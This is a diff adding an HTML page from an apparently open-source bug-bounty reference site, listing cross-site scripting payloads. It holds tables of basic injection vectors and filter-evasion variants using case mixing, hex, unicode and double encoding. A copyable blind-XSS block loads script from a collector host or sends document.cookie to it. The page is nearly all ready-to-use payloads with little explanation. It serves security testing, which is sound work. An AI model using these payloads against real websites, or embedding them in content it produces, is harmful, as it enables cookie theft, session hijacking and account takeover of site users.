@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Payloads - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="payloads.html" class="nav-link">Payloads</a></li>
+                <li><a href="payloads-xss.html" class="nav-link active">XSS</a></li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <a href="payloads.html">Payloads</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>XSS</span>
+        </div>
+        <h1><i class="fas fa-bug"></i> XSS Payloads</h1>
+        <p>Cross-Site Scripting payload collection for testing.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-folder-open"></i> Folder Contents</h2>
+                <p>This folder contains Cross-Site Scripting (XSS) payloads for testing JavaScript injection vulnerabilities.</p>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-bolt"></i> Basic XSS Payloads</h2>
+                <table>
+                    <tr>
+                        <th>Type</th>
+                        <th>Payload</th>
+                    </tr>
+                    <tr>
+                        <td>Basic Script</td>
+                        <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Image Error</td>
+                        <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>SVG Onload</td>
+                        <td><code>&lt;svg onload=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Body Onload</td>
+                        <td><code>&lt;body onload=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Input Autofocus</td>
+                        <td><code>&lt;input autofocus onfocus=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Video Source</td>
+                        <td><code>&lt;video src=x onerror=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Audio Source</td>
+                        <td><code>&lt;audio src=x onerror=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>IFrame</td>
+                        <td><code>&lt;iframe src=javascript:alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Object Data</td>
+                        <td><code>&lt;object data=javascript:alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Embed Src</td>
+                        <td><code>&lt;embed src=javascript:alert(1)&gt;</code></td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-filter"></i> Filter Evasion Payloads</h2>
+                <table>
+                    <tr>
+                        <th>Technique</th>
+                        <th>Payload</th>
+                    </tr>
+                    <tr>
+                        <td>No Spaces</td>
+                        <td><code>&lt;img/src=x/onerror=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Uppercase</td>
+                        <td><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Hex Encoding</td>
+                        <td><code>&lt;img src=x onerror=\x61lert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Unicode</td>
+                        <td><code>&lt;img src=x onerror=alert\u00281\u0029&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Double Encoding</td>
+                        <td><code>%253Cscript%253Ealert(1)%253C%252Fscript%253E</code></td>
+                    </tr>
+                    <tr>
+                        <td>HTML Entities</td>
+                        <td><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-eye-slash"></i> Blind XSS Payloads</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>&lt;script src="https://your.xss.ht"&gt;&lt;/script&gt;
+&lt;img src="https://your.xss.ht"&gt;
+&lt;svg onload="fetch('https://your.xss.ht?c='+document.cookie)"&gt;
+&lt;script&gt;new Image().src="https://your.xss.ht?c="+document.cookie&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-link"></i> Related Pages</h2>
+                <a href="xss.html" class="btn btn-primary">XSS Testing Guide</a>
+                <a href="blind-xss.html" class="btn btn-secondary" style="margin-left: 0.5rem;">Blind XSS</a>
+                <a href="csp-guide.html" class="btn btn-secondary" style="margin-left: 0.5rem;">CSP Guide</a>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+            <p>Made with <i class="fas fa-heart"></i> for the security community</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="script.js"></script>
+</body>
+</html>
